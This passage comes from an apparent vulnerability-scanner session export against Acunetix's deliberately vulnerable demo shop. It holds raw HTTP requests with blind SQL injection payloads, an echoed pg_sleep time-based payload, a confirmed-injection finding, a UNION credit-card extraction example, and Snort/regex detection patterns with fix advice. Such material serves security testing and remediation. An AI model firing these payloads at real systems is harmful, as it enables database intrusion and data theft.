      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  <li><a href="../logout.php">Logout</a></li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="4DEEE6CA66FB1CB21E3E80C7281E36DA"><Method>POST</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uname=12345%27%09OR%09(select%09ASCII(SUBSTR(schema()%2c1%2c1)))%09%3c128%09OR%09%274%27%3d%270&amp;pass=foo</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0;login=test%2Ftest
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/login.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>104</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="4DEEE6CA66FB1CB21E3E80C7281E36DA";PSID="885A3DDA5BF99592E4ACCDD310484D37";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="33";AttackParamDesc="uname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="12345%2527%2509OR%2509(select%2509ASCII(SUBSTR(schema()%252c1%252c1)))%2509%253c128%2509OR%2509%25274%2527%253d%25270";AttackStringProps="Attack";tid="46";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="41";smi="0";sc="1";ID="d62a6f4d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="356d5b17";sc="1";tid="46";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie><Cookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie>Set-Cookie: login=test%2Ftest
</SetCookie><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>user info</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
	<a href='logout.php'>Logout test</a>	</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>(SELECT pg_sleep(20)) (test)</h2><div class='story'><p>On this page you can visualize or edit you user information.</p></div><div class='story'>
      	  
			<form name="form1" method="post" action="">
				

				
				
				<table border="0" cellspacing="1" cellpadding="4">
					<tr><td valign="top">Name:</td><td><input type="text" value="(SELECT pg_sleep(20))" name="urname" style="width:200px"></td></tr>
					<tr><td valign="top">Credit card number:</td><td><input type="text" value="6341-2736-2836-9533" name="ucc" style="width:200px"></td></tr>
					<tr><td valign="top">E-Mail:</td><td><input type="text" value="test" name="uemail" style="width:200px"></td></tr>
					<tr><td valign="top">Phone number:</td><td><input type="text" value="test" name="uphone" style="width:200px"></td></tr>
					<tr><td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px">test</textarea></td></tr>
					<tr><td colspan="2" align="right"><input type="submit" value="update" name="update"></td></tr>
				</table>
			</form>
			</div><div class='story'><p>You have 0 items in your cart. You visualize you cart <a href='cart.php'>here</a>.</p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  <li><a href="../logout.php">Logout</a></li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:30 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Length</Name><Value>6004</Value></Header><Header><Name>Set-Cookie</Name><Value>login=test%2Ftest</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header></Headers><SetCookies><SetCookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Expires /><Path /><Secure>false</Secure></SetCookie></SetCookies><Forms><Form><Action /><Method>post</Method><Name>form1</Name><OnSubmit /><InputFields><InputField><Name>urname</Name><Value>(SELECT pg_sleep(20))</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>ucc</Name><Value>6341-2736-2836-9533</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>uemail</Name><Value>test</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>uphone</Name><Value>test</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>update</Name><Value>update</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>uaddress</Name><Value>test</Value><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="BA84FA43201A81FE9EDB03DE1A6D46D4"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>pass</AttackParamDescriptor><Issues><Issue id="33a817d4-f41e-48f6-944a-b764b01f5d7b"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[POST /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="BA84FA43201A81FE9EDB03DE1A6D46D4";PSID="885A3DDA5BF99592E4ACCDD310484D37";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="31";AttackParamDesc="pass";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="foo%2527%2509OR%2509(select%2509ASCII(SUBSTR(schema()%252c1%252c1)))%2509%253c128%2509OR%2509%25274%2527%253d%25270";AttackStringProps="Attack";tid="45";tt="40";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="903be015";
X-Request-Memo: ID="526a80b6";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

uname=12345&pass=foo%27%09OR%09(select%09ASCII(SUBSTR(schema()%2c1%2c1)))%09%3c128%09OR%09%274%27%3d%270]]></AttackHTTPRequest><VulnerabilityID>11299</VulnerabilityID><Severity>4</Severity><Name>Blind SQL Injection (Confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<hp-img src="sql.rgc" /><br /><drc_sqli />


Critical Blind SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. Normal SQL Injection attacks depend in a large measure on an attacker reverse engineering portions of the original SQL query using information gained from error messages.  However, your application can still be susceptible to Blind SQL injection even if no error message is displayed.  If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="BA84FA43201A81FE9EDB03DE1A6D46D4"><![CDATA[POST /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="BA84FA43201A81FE9EDB03DE1A6D46D4";PSID="885A3DDA5BF99592E4ACCDD310484D37";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="31";AttackParamDesc="pass";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="foo%2527%2509OR%2509(select%2509ASCII(SUBSTR(schema()%252c1%252c1)))%2509%253c128%2509OR%2509%25274%2527%253d%25270";AttackStringProps="Attack";tid="45";tt="40";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="903be015";
X-Request-Memo: ID="526a80b6";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

uname=12345&pass=foo%27%09OR%09(select%09ASCII(SUBSTR(schema()%2c1%2c1)))%09%3c128%09OR%09%274%27%3d%270]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:30 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Length: 6004
Set-Cookie: login=test%2Ftest
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>user info</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
	<a href='logout.php'>Logout test</a>	</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>(SELECT pg_sleep(20)) (test)</h2><div class='story'><p>On this page you can visualize or edit you user information.</p></div><div class='story'>
      	  
			<form name="form1" method="post" action="">
				

				
				
				<table border="0" cellspacing="1" cellpadding="4">
					<tr><td valign="top">Name:</td><td><input type="text" value="(SELECT pg_sleep(20))" name="urname" style="width:200px"></td></tr>
					<tr><td valign="top">Credit card number:</td><td><input type="text" value="6341-2736-2836-9533" name="ucc" style="width:200px"></td></tr>
					<tr><td valign="top">E-Mail:</td><td><input type="text" value="test" name="uemail" style="width:200px"></td></tr>
